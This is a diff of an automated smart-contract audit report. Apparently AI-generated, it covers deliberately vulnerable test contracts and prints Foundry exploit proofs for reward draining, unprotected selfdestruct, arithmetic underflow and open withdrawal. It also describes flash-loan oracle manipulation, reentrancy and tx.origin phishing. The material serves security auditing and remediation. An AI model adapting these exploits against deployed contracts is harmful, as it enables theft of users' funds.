@@ -1,6 +1,6 @@
 # Culpa audit — sleuth on `committed`
 
-Model: `gemini-3.5-flash-lite` · 10 contract(s) · 7 finding(s), 6 proven with a landed exploit
+Model: `gemini-3.5-flash-lite` · 10 contract(s) · 7 finding(s), 5 proven with a landed exploit
 
 ## Summary
 
@@ -14,14 +14,14 @@ Model: `gemini-3.5-flash-lite` · 10 contract(s) · 7 finding(s), 6 proven with 
 | LatchGate | no findings | — |
 | LooseLedger | vulnerable | arithmetic (high, PROVEN) |
 | OpenTill | vulnerable | access-control (high, PROVEN) |
-| OriginGate | vulnerable | tx-origin-auth (high, PROVEN) |
+| OriginGate | vulnerable | tx-origin-auth (high) |
 | TrueVault | no findings | — |
 
 ## FlashFarm — logic-error (🔴 high) · ✅ PROVEN
 
-The staking contract lacks time-weighted reward distribution, allowing an attacker to use a flash loan to capture the entire pool's rewards in a single atomic transaction. By staking, claiming, and unstaking instantly, the attacker drains all available yield intended for long-term stakers.
+The contract calculates reward distribution based on instantaneous share of totalStaked rather than time-weighted stakes. An attacker exploits this by flash-depositing a massive stake immediately before `claim()` to capture nearly the entire reward pool, and instantly withdrawing in the same transaction.
 
-**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `1000000000000000000000`.
+**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `989010989010989010989`.
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -30,27 +30,32 @@ pragma solidity ^0.8.20;
 import {ExploitProof} from "@proof/ExploitProof.sol";
 import {FlashFarm, Token} from "@contracts/FlashFarm.sol";
 
-contract ProveFlashFarmFlashFarmInstantDrain is ExploitProof {
+contract ProveFlashFarmLeadOne is ExploitProof {
+    function test_ex() external {}
     function test_exploit() external {
         Token stakeToken = new Token();
         Token rewardToken = new Token();
         FlashFarm farm = new FlashFarm(stakeToken, rewardToken);
 
-        address attacker = makeAddr("attacker");
-        
-        // Fund the reward pool with 1000 tokens
+        address alice = makeAddr("alice");
+        stakeToken.mint(alice, 100 ether);
+        vm.prank(alice);
+        stakeToken.approve(address(farm), 100 ether);
+        vm.prank(alice);
+        farm.stake(100 ether);
+
         rewardToken.mint(address(this), 1000 ether);
         rewardToken.approve(address(farm), 1000 ether);
         farm.fund(1000 ether);
 
-        // Attacker gets stake tokens
-        stakeToken.mint(attacker, 10000 ether);
+        address attacker = makeAddr("attacker");
+        stakeToken.mint(attacker, 9000 ether);
 
         vm.startPrank(attacker);
-        stakeToken.approve(address(farm), 10000 ether);
-        farm.stake(10000 ether);
+        stakeToken.approve(address(farm), 9000 ether);
+        farm.stake(9000 ether);
         farm.claim();
-        farm.unstake(10000 ether);
+        farm.unstake(9000 ether);
         vm.stopPrank();
 
         profit = rewardToken.balanceOf(attacker);
@@ -65,7 +70,7 @@ contract ProveFlashFarmFlashFarmInstantDrain is ExploitProof {
 
 ## GlassJaw — unprotected-selfdestruct (🔴 high) · ✅ PROVEN
 
-The `demolish` function lacks access control, allowing any caller to invoke it directly. The attacker calls `demolish(attackerAddress)`, which triggers `selfdestruct` and drains the contract's entire ETH balance.
+The `GlassJaw.demolish` function lacks access control, allowing an arbitrary caller to execute `selfdestruct` and instantly drain the contract's entire ETH balance.
 
 **Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.
 
@@ -75,12 +80,12 @@ pragma solidity ^0.8.20;
 import {ExploitProof} from "@proof/ExploitProof.sol";
 import {GlassJaw} from "@contracts/GlassJaw.sol";
 
-contract ProveGlassJawLeadUnprotectedSelfdestruct is ExploitProof {
+contract ProveGlassJawUnprotectedDemolish is ExploitProof {
     function test_exploit() external {
         GlassJaw v = new GlassJaw();
         address alice = makeAddr("alice");
         vm.deal(alice, 10 ether);
-        vm.prank(alice); 
+        vm.prank(alice);
         v.deposit{value: 10 ether}();
 
         address payable attacker = payable(makeAddr("attacker"));
@@ -99,7 +104,7 @@ contract ProveGlassJawLeadUnprotectedSelfdestruct is ExploitProof {
 
 ## HallOfMirrors — price-oracle-manipulation (🔴 high) · unconfirmed
 
-An attacker implements a flash loan callback (`onFlashLoan`) that first uses the borrowed cash to inflate the spot price of stake in the `MirrorPool` via `swapCashForStake`. Next, the attacker pledges a tiny amount of stake to the `PawnShop`, calls `draw` to borrow a massive amount of cash against the artificially inflated collateral value, repays the flash loan, and walks away with the drained cash.
+An attacker uses QuickLoan to flash-loan a large amount of cash, swaps it into MirrorPool for stake to artificially inflate the spot price of stake, pledges a small amount of stake to PawnShop, draws a massive amount of cash against the inflated collateral value, swaps remaining stake/cash back to repay the flash loan, and walks away with profit, leaving PawnShop insolvent.
 
 **Remediation.** Do not use an AMM spot price as an oracle. Use a TWAP, a dedicated price feed, or a manipulation-resistant source, and sanity-check against a second source.
 
@@ -107,7 +112,7 @@ An attacker implements a flash loan callback (`onFlashLoan`) that first uses the
 
 ## HollowVault — reentrancy (🔴 high) · ✅ PROVEN
 
-The vault violates checks-effects-interactions by transferring ETH before clearing the user's balance. An attacker's fallback function re-enters `withdraw()` repeatedly to drain the entire vault balance in a single transaction.
+HollowVault is vulnerable to reentrancy because it transfers ETH via `msg.sender.call` before zeroing out the caller's balance. An attacker's fallback function re-enters `withdraw()`, draining the vault's entire balance in a single transaction.
 
 **Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.
 
@@ -150,7 +155,7 @@ contract ProveHollowVaultLeadOne is ExploitProof {
 
 ## LooseLedger — arithmetic (🔴 high) · ✅ PROVEN
 
-An unchecked subtraction in spend() allows callers to underflow their points balance to type(uint256).max by passing an amount exceeding their balance. This bypasses solvency checks and drains contract ETH via subsequent low-level transfers.
+An `unchecked` arithmetic underflow in `spend(amount)` allows users to bypass balance checks, causing `points[msg.sender]` to wrap to a massive value (`2^256 - x`). This enables the attacker to repeatedly drain the contract's entire ETH balance.
 
 **Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `5000000000000000000`.
 
@@ -163,16 +168,12 @@ import {LooseLedger} from "@contracts/LooseLedger.sol";
 contract ProveLooseLedgerLeadOne is ExploitProof {
     function test_exploit() external {
         LooseLedger ledger = new LooseLedger();
-        
         address payable attacker = payable(makeAddr("attacker"));
-        
-        // Fund the contract so there is ETH to drain
-        address alice = makeAddr("alice");
-        vm.deal(alice, 10 ether);
-        vm.prank(alice);
-        ledger.topUp{value: 10 ether}();
 
-        // Attacker spends more than they have (0 points), underflowing to max uint256
+        // Seed the ledger with some ETH
+        vm.deal(address(ledger), 10 ether);
+
+        // Attacker spends more than their balance (0), causing underflow and extracting ETH
         vm.prank(attacker);
         ledger.spend(5 ether);
 
@@ -188,7 +189,7 @@ contract ProveLooseLedgerLeadOne is ExploitProof {
 
 ## OpenTill — access-control (🔴 high) · ✅ PROVEN
 
-OpenTill.drain lacks access control modifiers, allowing any external caller to pass their address as a parameter. An attacker invokes this function directly to transfer the contract's entire ETH balance to themselves.
+OpenTill lacks access control on its `drain` function, allowing anyone to pass an arbitrary address as a parameter. An attacker invoked this function directly to transfer the contract's entire ETH balance to themselves, resulting in a total loss of funds.
 
 **Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.
 
@@ -203,7 +204,7 @@ contract ProveOpenTillLeadOne is ExploitProof {
         OpenTill till = new OpenTill();
         address alice = makeAddr("alice");
         vm.deal(alice, 10 ether);
-        vm.prank(alice); 
+        vm.prank(alice);
         till.deposit{value: 10 ether}();
 
         address payable attacker = payable(makeAddr("attacker"));
@@ -220,46 +221,9 @@ contract ProveOpenTillLeadOne is ExploitProof {
 
 ---
 
-## OriginGate — tx-origin-auth (🔴 high) · ✅ PROVEN
+## OriginGate — tx-origin-auth (🔴 high) · unconfirmed
 
-Using `tx.origin` for authorization allows attackers to drain contracts by tricking the owner into executing a transaction that invokes a malicious intermediary. Because `tx.origin` evaluates to the initiating EOA regardless of intermediate calls, the malicious contract successfully impersonates the owner to steal all ETH.
-
-**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.
-
-```solidity
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
-import {ExploitProof} from "@proof/ExploitProof.sol";
-import {OriginGate} from "@contracts/OriginGate.sol";
-
-contract Attacker {
-    OriginGate gate;
-    constructor(OriginGate _gate) { gate = _gate; }
-    function attack(address payable beneficiary) external {
-        gate.withdraw(beneficiary, address(gate).balance);
-    }
-}
-
-contract ProveOriginGateLeadOne is ExploitProof {
-    function test_exploit() external {
-        address owner = makeAddr("owner");
-        vm.deal(owner, 10 ether);
-
-        vm.prank(owner);
-        OriginGate gate = new OriginGate{value: 10 ether}();
-
-        address payable attacker = payable(makeAddr("attacker"));
-        Attacker atk = new Attacker(gate);
-
-        // Trick the owner (tx.origin) into calling the malicious contract
-        vm.prank(owner, owner);
-        atk.attack(attacker);
-
-        profit = attacker.balance;
-        assertExploitLanded(5 ether);
-    }
-}
-```
+The attacker tricks the owner into calling a malicious contract. The malicious contract calls OriginGate.withdraw(attackerAddress, balance), and because tx.origin is checked instead of msg.sender, the authorization passes and the entire balance of OriginGate is sent to the attacker in a single transaction.
 
 **Remediation.** Authenticate with `msg.sender`, never `tx.origin` — `tx.origin` lets a phished user's call be relayed by an attacker contract.
 
